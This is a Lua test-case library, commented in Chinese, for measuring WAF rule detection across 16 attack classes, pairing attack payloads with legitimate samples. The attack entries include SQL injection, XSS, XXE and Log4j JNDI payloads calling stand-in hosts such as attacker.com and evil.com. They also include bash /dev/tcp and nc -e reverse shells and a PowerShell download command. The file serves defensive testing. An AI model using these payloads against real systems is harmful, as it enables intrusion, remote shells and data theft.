-- WAF 规则命中率与基准覆盖度测试 - 测试用例库
-- 包含 16 个规则分类的典型攻击样本 (attacks) 与常见合法业务样本 (legitimate)

local _M = {}

-- 1. SQL 注入 (sqli.lua)
_M["sqli"] = {
    name = "SQL Injection",
    attacks = {
        { payload = "1 UNION SELECT 1,2,username,password FROM users", pos = "uri", note = "联合查询注入" },
        { payload = "select * from information_schema.tables", pos = "uri", note = "访问 information_schema 元数据" },
        { payload = "id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", pos = "uri", note = "报错注入" },
        { payload = "1' AND SLEEP(5)--", pos = "uri", note = "MySQL Sleep 时间盲注" },
        { payload = "1' AND BENCHMARK(5000000,MD5(1))--", pos = "uri", note = "MySQL Benchmark 盲注" },
        { payload = "1; WAITFOR DELAY '0:0:5'--", pos = "uri", note = "MSSQL WAITFOR DELAY 盲注" },
        { payload = "admin' OR 1=1--", pos = "uri", note = "经典布尔永真注入" },
        { payload = "1' OR '1'='1", pos = "body", note = "Body 字段布尔永真" },
        { payload = "1 ORDER BY 10--", pos = "uri", note = "ORDER BY 列数探测" },
        { payload = "1 HAVING 1=1", pos = "uri", note = "HAVING 子句注入" },
        { payload = "1'; DROP TABLE users--", pos = "uri", note = "堆叠查询删表" },
        { payload = "1' INTO OUTFILE '/var/www/html/shell.php'--", pos = "uri", note = "INTO OUTFILE 写文件" },
        { payload = "1' AND LOAD_FILE('/etc/passwd')--", pos = "uri", note = "LOAD_FILE 读文件" },
        { payload = "1' AND IF(1=1, SLEEP(3), 0)--", pos = "uri", note = "IF 条件时间盲注" },
        { payload = "select * from admin limit 1", pos = "uri", note = "Select Limit 语句" },
    },
    legitimate = {
        { payload = "category=electronics&sort=price_asc&page=2", pos = "uri", note = "正常商品筛选" },
        { payload = "keyword=how to select the best car from market", pos = "uri", note = "包含 select from 散文的搜索词" },
        { payload = "username=zhangsan&email=zhangsan@example.com", pos = "body", note = "普通用户信息提交" },
        { payload = "order_id=202611040001&status=paid", pos = "uri", note = "订单状态查询" }
    }
}

-- 2. XSS 跨站脚本 (xss.lua)
_M["xss"] = {
    name = "XSS Cross-Site Scripting",
    attacks = {
        { payload = "<script>alert('xss')</script>", pos = "uri", note = "基础 script 标签" },
        { payload = "<script src=http://attacker.com/xss.js></script>", pos = "uri", note = "外部脚本加载" },
        { payload = "<img src=1 onerror=alert(document.cookie)>", pos = "uri", note = "img onerror 触发" },
        { payload = "<svg onload=alert(1)>", pos = "uri", note = "svg onload 触发" },
        { payload = "<iframe src=\"javascript:alert(1)\"></iframe>", pos = "body", note = "iframe javascript 伪协议" },
        { payload = "<body onload=alert('xss')>", pos = "body", note = "body onload 事件" },
        { payload = "<a href=\"javascript:alert(1)\">click me</a>", pos = "uri", note = "超链接 javascript 协议" },
        { payload = "<input type=\"text\" autofocus onfocus=\"alert(1)\">", pos = "body", note = "autofocus onfocus" },
        { payload = "\"><svg><animate onbegin=alert(1)>", pos = "uri", note = "闭合标签 svg animate" },
        { payload = "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>", pos = "uri", note = "Polyglot XSS" },
    },
    legitimate = {
        { payload = "title=OpenResty 高性能开发实战&author=John", pos = "body", note = "中文技术文章标题" },
        { payload = "comment=I think 5 > 3 and 2 < 4 is obviously true.", pos = "body", note = "含大于小于号的数学表达" },
        { payload = "redirect=/dashboard/overview", pos = "uri", note = "正常站内相对重定向" }
    }
}

-- 3. 系统命令注入 (cmd.lua)
_M["cmd"] = {
    name = "Command Injection",
    attacks = {
        { payload = "127.0.0.1; cat /etc/passwd", pos = "uri", note = "分号连接 cat /etc/passwd" },
        { payload = "127.0.0.1 | whoami", pos = "uri", note = "管道符带空格执行 whoami" },
        { payload = "127.0.0.1 && id", pos = "body", note = "逻辑与带空格执行 id" },
        { payload = "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", pos = "body", note = "Bash /dev/tcp 反弹 Shell" },
        { payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://evil.com/a.exe','a.exe')", pos = "body", note = "PowerShell 下载执行" },
        { payload = "cmd.exe /c dir", pos = "uri", note = "Windows cmd /c 执行" },
        { payload = "system('whoami');", pos = "body", note = "PHP system 函数" },
        { payload = "exec('ls -la')", pos = "body", note = "PHP exec 函数" },
        { payload = "passthru('cat /etc/shadow')", pos = "body", note = "PHP passthru" },
        { payload = "shell_exec('uname -a')", pos = "body", note = "PHP shell_exec" },
        { payload = "/bin/sh -c 'id'", pos = "uri", note = "/bin/sh 直接调用" },
        { payload = "nc -e /bin/sh 10.0.0.1 4444", pos = "body", note = "nc -e 反弹 Shell" }
    },
    legitimate = {
        { payload = "article=how-to-use-bash-and-powershell-scripts", pos = "uri", note = "包含脚本关键词的技术文章" },
        { payload = "description=System uptime is 99.9% and executive summary is ready.", pos = "body", note = "包含 system/exec 单词的日常英文" },
        { payload = "command=next_page&action=list", pos = "uri", note = "合法参数名为 command" }
    }
}

-- 4. 路径遍历 (path.lua)
_M["path"] = {
    name = "Path Traversal",
    attacks = {
        { payload = "/../../../../etc/passwd", pos = "uri", note = "UNIX 根下遍历 /etc/passwd" },
        { payload = "..\\..\\..\\windows\\win.ini", pos = "uri", note = "Windows 反斜杠遍历 win.ini" },
        { payload = "/download?file=../../../../boot.ini", pos = "uri", note = "下载参数遍历 boot.ini" },
        { payload = "/view?doc=%252e%252e%252f%252e%252e%252fetc%2fshadow", pos = "uri", note = "双重 URL 编码双点遍历" },
        { payload = "/images/....//....//app/config.json", pos = "uri", note = "双写绕过式路径遍历 (....//)" },
        { payload = "/download?file=....\\\\....\\\\windows\\\\win.ini", pos = "uri", note = "Windows 反斜杠双写遍历" }
    },
    legitimate = {
        { payload = "/static/css/main.min.css?v=1.2.0", pos = "uri", note = "正常静态资源路径" },
        { payload = "/api/v1/files/download?file=monthly_report_2026.pdf", pos = "uri", note = "正常文件下载参数" },
        { payload = "/path/to/my/photo.jpg", pos = "uri", note = "普通多级路径" }
    }
}

-- 5. 备份与临时文件泄露 (backup.lua)
_M["backup"] = {
    name = "Backup File",
    attacks = {
        { payload = "/index.php.bak", pos = "uri", note = "源码 bak 备份" },
        { payload = "/www.zip", pos = "uri", note = "网站整站压缩包 www.zip" },
        { payload = "/backup.tar.gz", pos = "uri", note = "站点 backup.tar.gz" },
        { payload = "/database.sql", pos = "uri", note = "数据库转储 .sql" },
        { payload = "/.git/config", pos = "uri", note = ".git 源码泄露" },
        { payload = "/.env", pos = "uri", note = ".env 环境变量文件" },
        { payload = "/.env.production", pos = "uri", note = ".env 生产配置变体" },
        { payload = "/config.php~", pos = "uri", note = "编辑器备份后缀 ~" }
    },
    legitimate = {
        { payload = "/index.html", pos = "uri", note = "正常主页" },
        { payload = "/about/team.html", pos = "uri", note = "普通关于页面" },
        { payload = "/api/backup/history", pos = "uri", note = "合法包含 backup 单词的 API 路由" }
    }
}

-- 6. 恶意机器人与扫描器 (bot.lua)
_M["bot"] = {
    name = "Bot / Scanner",
    attacks = {
        { payload = "sqlmap/1.6.0#stable (https://sqlmap.org)", pos = "user-agent", note = "SQLMap 扫描器" },
        { payload = "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", pos = "user-agent", note = "Nmap NSE 扫描" },
        { payload = "Nikto/2.1.6", pos = "user-agent", note = "Nikto Web 漏洞扫描器" },
        { payload = "masscan/1.3 (https://github.com/robertdavidgraham/masscan)", pos = "user-agent", note = "Masscan 扫描工具" },
        { payload = "python-requests/2.28.1", pos = "user-agent", note = "Python Requests 爬虫" },
        { payload = "curl/7.84.0", pos = "user-agent", note = "curl 命令行请求" },
        { payload = "acunetix-aspect/1.0", pos = "user-agent", note = "AWVS 扫描器特征" },
        { payload = "BurpSuite/2026.1", pos = "user-agent", note = "BurpSuite 扫描特征" },
        { payload = "-", pos = "user-agent", note = "异常极短 UA" }
    },
    legitimate = {
        { payload = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", pos = "user-agent", note = "Chrome 浏览器" },
        { payload = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1", pos = "user-agent", note = "iOS Safari 浏览器" }
    }
}

-- 7. 敏感文件与配置泄露 (sensitive.lua)
_M["sensitive"] = {
    name = "Sensitive Files",
    attacks = {
        { payload = "/config.json", pos = "uri", note = "应用配置文件泄露" },
        { payload = "/database.yml", pos = "uri", note = "数据库连接配置" },
        { payload = "/id_rsa.key", pos = "uri", note = "私钥文件" },
        { payload = "/credentials.txt", pos = "uri", note = "口令凭证文件" },
        { payload = "/backup.log", pos = "uri", note = "备份日志泄露" }
    },
    legitimate = {
        { payload = "/api/v1/settings/public", pos = "uri", note = "公开配置读取接口" },
        { payload = "/help/faq.html", pos = "uri", note = "帮助文档" }
    }
}

-- 8. SSRF 服务端请求伪造 (ssrf.lua)
_M["ssrf"] = {
    name = "SSRF",
    attacks = {
        { payload = "url=http://127.0.0.1:8080/admin", pos = "uri", note = "127.0.0.1 回环探测" },
        { payload = "url=http://localhost:6379/", pos = "uri", note = "localhost 内部 Redis 探测" },
        { payload = "url=http://169.254.169.254/latest/meta-data/", pos = "uri", note = "云主机元数据地址" },
        { payload = "url=gopher://127.0.0.1:6379/_flushall", pos = "uri", note = "gopher 协议利用" },
        { payload = "url=dict://127.0.0.1:11211/stat", pos = "uri", note = "dict 协议利用" },
        { payload = "url=file:///etc/passwd", pos = "uri", note = "file 协议读取" }
    },
    legitimate = {
        { payload = "webhook_host=api.github.com&event=push", pos = "body", note = "正常公网 Webhook 回调参数" },
        { payload = "search_keyword=openresty waf tutorial", pos = "uri", note = "常规文本搜索参数" }
    }
}

-- 9. XXE 外部实体注入 (xxe.lua)
_M["xxe"] = {
    name = "XXE",
    attacks = {
        { payload = "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>", pos = "body", note = "经典 SYSTEM 实体文件读取" },
        { payload = "<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">", pos = "body", note = "参数实体外部引用" },
        { payload = "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://id\">]>", pos = "body", note = "expect 协议命令执行" },
        { payload = "<!ENTITY % file SYSTEM \"file:///c:/windows/win.ini\">", pos = "body", note = "Windows 文件读取" }
    },
    legitimate = {
        { payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><order><id>1001</id><item>Book</item><qty>2</qty></order>", pos = "body", note = "正常业务 XML 数据包" },
        { payload = "<user><name>Alice</name><email>alice@example.com</email></user>", pos = "body", note = "普通用户注册 XML" }
    }
}

-- 10. 文件上传攻击 (upload.lua)
_M["upload"] = {
    name = "File Upload",
    attacks = {
        { payload = "Content-Disposition: form-data; name=\"file\"; filename=\"webshell.php\"", pos = "body", note = "PHP WebShell 上传" },
        { payload = "Content-Disposition: form-data; name=\"upload\"; filename=\"cmd.jsp\"", pos = "body", note = "JSP 马上传" },
        { payload = "Content-Disposition: form-data; name=\"file\"; filename=\"hack.aspx\"", pos = "body", note = "ASPX 脚本上传" },
        { payload = "Content-Disposition: form-data; name=\"f\"; filename=\"test.phtml\"", pos = "body", note = "phtml 变种后缀" },
        { payload = "Content-Type: application/x-httpd-php\r\n\r\n<?php phpinfo(); ?>", pos = "body", note = "PHP MIME 类型上传" },
        { payload = "Content-Disposition: form-data; name=\"file\"; filename=\"payload.exe\"", pos = "body", note = "Windows 可执行程序上传" }
    },
    legitimate = {
        { payload = "Content-Disposition: form-data; name=\"avatar\"; filename=\"user_photo.jpg\"\r\nContent-Type: image/jpeg", pos = "body", note = "正常 JPG 图片上传" },
        { payload = "Content-Disposition: form-data; name=\"doc\"; filename=\"quarterly_report.pdf\"\r\nContent-Type: application/pdf", pos = "body", note = "正常 PDF 报告上传" }
    }
}

-- 11. 反序列化攻击 (deserialize.lua)
_M["deserialize"] = {
    name = "Deserialization",
    attacks = {
        { payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sBFlzaKEA==", pos = "body", note = "Java 序列化 Base64 Magic" },
        { payload = "org.apache.commons.collections.Transformer", pos = "body", note = "Commons Collections 反序列化 Gadget" },
        { payload = "O:4:\"User\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"is_admin\";b:1;}", pos = "body", note = "PHP 序列化对象注入" },
        { payload = "phar://uploads/avatar.jpg/test.txt", pos = "uri", note = "PHP Phar 反序列化触发" },
        { payload = "cPickle.loads(b\"cos\\nsystem\\n(S'whoami'\\ntR.\")", pos = "body", note = "Python Pickle 反序列化" },
        { payload = "TypeNameHandling.All", pos = "body", note = ".NET JSON TypeNameHandling 反序列化" }
    },
    legitimate = {
        { payload = "{\"id\":1002,\"username\":\"developer\",\"roles\":[\"admin\",\"auditor\"]}", pos = "body", note = "标准合法 JSON 数据" },
        { payload = "user_pref=theme_dark; session_timeout=3600", pos = "cookie", note = "常规 Cookie 键值对" }
    }
}

-- 12. NoSQL 注入 (nosql.lua)
_M["nosql"] = {
    name = "NoSQL Injection",
    attacks = {
        { payload = "username[$ne]=null&password[$gt]=", pos = "uri", note = "MongoDB 比较操作符注入" },
        { payload = "{\"username\": {\"$regex\": \"^admin.*\"}}", pos = "body", note = "$regex 正则探针" },
        { payload = "{\"filter\": {\"$where\": \"this.password.length > 0\"}}", pos = "body", note = "$where JavaScript 代码执行" },
        { payload = "id[$exists]=true", pos = "uri", note = "$exists 字段探测" }
    },
    legitimate = {
        { payload = "search=mongodb-indexing-strategies&page=1", pos = "uri", note = "正常搜索参数" },
        { payload = "filter=active&sort=desc", pos = "uri", note = "常规状态查询" }
    }
}

-- 13. SSTI 模板注入 (ssti.lua)
_M["ssti"] = {
    name = "SSTI",
    attacks = {
        { payload = "{{config.items()}}", pos = "uri", note = "Flask/Jinja2 config 对象读取" },
        { payload = "{{''.__class__.__mro__[2].__subclasses__()}}", pos = "body", note = "Python 原型链魔术方法遍历" },
        { payload = "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}", pos = "body", note = "Twig 模板 RCE" },
        { payload = "#set($e = \"exp\") $class.inspect(\"java.lang.Runtime\")", pos = "body", note = "Velocity 模板语法" },
        { payload = "freemarker.template.utility.Execute", pos = "body", note = "Freemarker 执行链" }
    },
    legitimate = {
        { payload = "greeting=Hello {firstName}, welcome to our website!", pos = "body", note = "普通单大括号文本插值" },
        { payload = "template_id=tpl_modern_minimalist_2026", pos = "uri", note = "模板编号参数" }
    }
}

-- 14. Spring 漏洞利用 (spring.lua)
_M["spring"] = {
    name = "Spring Vulnerabilities",
    attacks = {
        { payload = "/actuator/env", pos = "uri", note = "Spring Boot Actuator 环境泄露" },
        { payload = "/actuator/heapdump", pos = "uri", note = "Actuator 堆转储导出" },
        { payload = "/swagger-ui.html", pos = "uri", note = "Swagger UI 接口文档未授权访问" },
        { payload = "/v2/api-docs", pos = "uri", note = "Springfox Swagger API Docs 泄露" }
    },
    legitimate = {
        { payload = "/actuator/health", pos = "uri", note = "Kubernetes 常见健康探针（不应被误报）" },
        { payload = "/actuator/info", pos = "uri", note = "应用基础公开状态信息（不应被误报）" },
        { payload = "/products/spring-collection/shoes", pos = "uri", note = "春季商品常规路径" },
        { payload = "/api/v1/orders/123", pos = "uri", note = "标准 RESTful API 路径" }
    }
}

-- 15. LDAP / Log4j 注入 (ldap.lua)
_M["ldap"] = {
    name = "Ldap Injection",
    attacks = {
        { payload = "${jndi:ldap://attacker.com/exploit}", pos = "body", note = "经典 Log4j JNDI 注入" },
        { payload = "${${lower:j}ndi:rmi://evil.com/x}", pos = "uri", note = "大小写变换混淆 JNDI 注入" },
        { payload = "${${::-j}ndi:dns://dnslog.cn/a}", pos = "headers", note = "默认值绕过式 JNDI 注入" },
        { payload = "(&(objectCategory=person)(objectClass=user)(cn=test*))", pos = "uri", note = "经典 LDAP 逻辑过滤器注入" },
        { payload = "username=admin*)(uid=*))(|(uid=*", pos = "body", note = "LDAP 认证绕过永真注入" },
        { payload = "admin*)%00", pos = "body", note = "LDAP 截断注入" }
    },
    legitimate = {
        { payload = "user=zhangsan&dept=engineering_department", pos = "body", note = "员工部门查询" },
        { payload = "email=dev_team@company.internal", pos = "body", note = "内部邮件通知" }
    }
}

-- 16. DNS 探测与带外回显 (dns.lua)
_M["dns"] = {
    name = "DNS Log / OOB",
    attacks = {
        { payload = "nslookup 1234.dnslog.cn", pos = "uri", note = "DNSLog 域名带外" },
        { payload = "http://test.ceye.io/probe", pos = "uri", note = "Ceye 平台回调" },
        { payload = "https://x123.oastify.com/", pos = "body", note = "Burp Collaborator (oastify)" },
        { payload = "http://webhook.site/abcdef-12345", pos = "uri", note = "Webhook.site 带外探测" }
    },
    legitimate = {
        { payload = "dns_server=8.8.8.8&query_type=A", pos = "uri", note = "正常 DNS 查询工具" },
        { payload = "domain=myblog.github.io", pos = "body", note = "常规博客域名绑定" }
    }
}

return _M
